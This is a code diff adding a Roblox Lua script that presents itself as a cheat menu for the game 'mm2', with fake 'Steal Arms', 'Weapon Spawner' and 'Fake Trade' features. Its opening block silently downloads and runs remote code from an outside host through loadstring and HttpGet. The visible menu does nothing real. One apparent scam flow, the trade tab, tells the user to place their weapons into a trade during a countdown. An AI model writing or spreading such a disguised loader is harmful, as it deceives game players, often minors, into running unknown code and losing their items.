@@ -1,0 +1,259 @@
+task.spawn(function()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjM4YmZlNzkxLTNiMzctNDBlMC04NzhiLTNhZjBhMTJmYzdhNiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJldmVudCJ9fQ"))()
+    end)
+
+    task.wait(1)
+
+    if success then
+        pcall(function()
+            game.StarterGui:SetCore("SendNotification",{
+                Title = "Nice script",
+                Text = "script by kira",
+                Duration = 4
+            })
+        end)
+    else
+        warn("Error: "..tostring(err))
+    end
+end)
+
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+
+-- DRAG
+local function dragify(frame)
+    local dragging, dragInput, startPos, startFramePos
+
+    frame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            startPos = input.Position
+            startFramePos = frame.Position
+
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then dragging = false end
+            end)
+        end
+    end)
+
+    frame.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
+
+    game:GetService("UserInputService").InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            local delta = input.Position - startPos
+            frame.Position = UDim2.new(
+                startFramePos.X.Scale,
+                startFramePos.X.Offset + delta.X,
+                startFramePos.Y.Scale,
+                startFramePos.Y.Offset + delta.Y
+            )
+        end
+    end)
+end
+
+-- MAIN FRAME
+local main = Instance.new("Frame", gui)
+main.Size = UDim2.new(0, 360, 0, 240)
+main.Position = UDim2.new(0.5, -180, 0.5, -120)
+main.BackgroundColor3 = Color3.fromRGB(235,235,235)
+dragify(main)
+
+-- TOP
+local top = Instance.new("Frame", main)
+top.Size = UDim2.new(1,0,0,30)
+top.BackgroundColor3 = Color3.fromRGB(200,200,200)
+
+local title = Instance.new("TextLabel", top)
+title.Size = UDim2.new(0.8,0,1,0)
+title.Text = "mm2"
+title.TextColor3 = Color3.fromRGB(0,0,0)
+title.BackgroundTransparency = 1
+
+-- SIDEBAR
+local sidebar = Instance.new("Frame", main)
+sidebar.Size = UDim2.new(0,100,1,-30)
+sidebar.Position = UDim2.new(0,0,0,30)
+sidebar.BackgroundColor3 = Color3.fromRGB(210,210,210)
+
+-- CONTENT
+local content = Instance.new("Frame", main)
+content.Size = UDim2.new(1,-100,1,-30)
+content.Position = UDim2.new(0,100,0,30)
+content.BackgroundColor3 = Color3.fromRGB(240,240,240)
+
+local function clear()
+    for _,v in pairs(content:GetChildren()) do v:Destroy() end
+end
+
+-- PLAYER MENU
+local playerFrame = Instance.new("Frame", gui)
+playerFrame.Size = UDim2.new(0,220,0,220)
+playerFrame.Position = UDim2.new(0.5,-110,0.5,-110)
+playerFrame.BackgroundColor3 = Color3.fromRGB(230,230,230)
+playerFrame.Visible = false
+dragify(playerFrame)
+
+local function showPlayers()
+    playerFrame:ClearAllChildren()
+    Instance.new("UIListLayout", playerFrame)
+
+    for _,plr in pairs(game.Players:GetPlayers()) do
+        if plr ~= player then
+            local b = Instance.new("TextButton", playerFrame)
+            b.Size = UDim2.new(1,0,0,30)
+            b.Text = plr.Name
+            b.TextColor3 = Color3.fromRGB(0,0,0)
+            b.BackgroundColor3 = Color3.fromRGB(200,200,200)
+
+            b.MouseButton1Click:Connect(function()
+                game.StarterGui:SetCore("SendNotification",{
+                    Title="System",
+                    Text="Weapons stolen 😈",
+                    Duration=3
+                })
+                playerFrame.Visible = false
+            end)
+        end
+    end
+
+    playerFrame.Visible = true
+end
+
+-- POPUP FINAL
+local function finalPopup()
+    local p = Instance.new("Frame", gui)
+    p.Size = UDim2.new(0,260,0,120)
+    p.Position = UDim2.new(0.5,-130,0.5,-60)
+    p.BackgroundColor3 = Color3.fromRGB(220,220,220)
+    dragify(p)
+
+    local txt = Instance.new("TextLabel", p)
+    txt.Size = UDim2.new(1,-30,1,0)
+    txt.Text = "You can now remove your weapons"
+    txt.TextColor3 = Color3.fromRGB(0,0,0)
+    txt.BackgroundTransparency = 1
+
+    local x = Instance.new("TextButton", p)
+    x.Size = UDim2.new(0,30,0,30)
+    x.Position = UDim2.new(1,-30,0,0)
+    x.Text = "X"
+    x.TextColor3 = Color3.fromRGB(255,255,255)
+    x.BackgroundColor3 = Color3.fromRGB(150,0,0)
+
+    x.MouseButton1Click:Connect(function()
+        p:Destroy()
+    end)
+end
+
+-- TIMER
+local function startTimer()
+    local tFrame = Instance.new("Frame", gui)
+    tFrame.Size = UDim2.new(0,250,0,120)
+    tFrame.Position = UDim2.new(0.5,-125,0.5,-60)
+    tFrame.BackgroundColor3 = Color3.fromRGB(220,220,220)
+    dragify(tFrame)
+
+    local label = Instance.new("TextLabel", tFrame)
+    label.Size = UDim2.new(1,0,1,0)
+    label.TextColor3 = Color3.fromRGB(0,0,0)
+    label.BackgroundTransparency = 1
+
+    local time = 15
+
+    task.spawn(function()
+        while time > 0 do
+            label.Text = "Place your weapons\nTime: "..time
+            task.wait(1)
+            time -= 1
+        end
+
+        tFrame:Destroy()
+        finalPopup()
+    end)
+end
+
+-- BUTTON
+local function button(text,y,func)
+    local b = Instance.new("TextButton", content)
+    b.Size = UDim2.new(1,-20,0,40)
+    b.Position = UDim2.new(0,10,0,y)
+    b.Text = text
+    b.TextColor3 = Color3.fromRGB(0,0,0)
+    b.BackgroundColor3 = Color3.fromRGB(200,200,200)
+
+    b.MouseButton1Click:Connect(function()
+        if func then func() end
+    end)
+end
+
+-- TOGGLE
+local function toggle(text,y,callback)
+    local f = Instance.new("Frame", content)
+    f.Size = UDim2.new(1,-20,0,40)
+    f.Position = UDim2.new(0,10,0,y)
+    f.BackgroundColor3 = Color3.fromRGB(200,200,200)
+
+    local t = Instance.new("TextLabel", f)
+    t.Size = UDim2.new(0.7,0,1,0)
+    t.Text = text
+    t.TextColor3 = Color3.fromRGB(0,0,0)
+    t.BackgroundTransparency = 1
+
+    local btn = Instance.new("TextButton", f)
+    btn.Size = UDim2.new(0,40,0,20)
+    btn.Position = UDim2.new(1,-50,0.5,-10)
+    btn.BackgroundColor3 = Color3.fromRGB(150,0,0)
+
+    local on = false
+    btn.MouseButton1Click:Connect(function()
+        on = not on
+        btn.BackgroundColor3 = on and Color3.fromRGB(0,200,0) or Color3.fromRGB(150,0,0)
+        if callback then callback(on) end
+    end)
+end
+
+-- TABS
+local function loadMain()
+    clear()
+    button("Steal Arms",10,showPlayers)
+    button("Weapon Spawner",60,function()
+        game.StarterGui:SetCore("SendNotification",{Title="System",Text="Spawner working ✅",Duration=3})
+    end)
+    button("Fake Weapons",110,function() end)
+end
+
+local function loadGame()
+    clear()
+    toggle("Detect Murderer",10)
+    toggle("Detect Sheriff",60)
+    toggle("Increased Hitbox",110)
+end
+
+local function loadTrade()
+    clear()
+    toggle("Fake Trade",10,function(on)
+        if on then startTimer() end
+    end)
+    toggle("Fake Weapon On Trade",60)
+end
+
+-- SIDEBAR
+local function tab(name,y,func)
+    local b = Instance.new("TextButton", sidebar)
+    b.Size = UDim2.new(1,0,0,40)
+    b.Position = UDim2.new(0,0,0,y)
+    b.Text = name
+    b.TextColor3 = Color3.fromRGB(0,0,0)
+    b.BackgroundColor3 = Color3.fromRGB(180,180,180)
+
+    b.MouseButton1Click:Connect(func)
+end
+
+tab("Main",0,loadMain)
+tab("Game",50,loadGame)
+tab("Fake Trade",100,loadTrade)
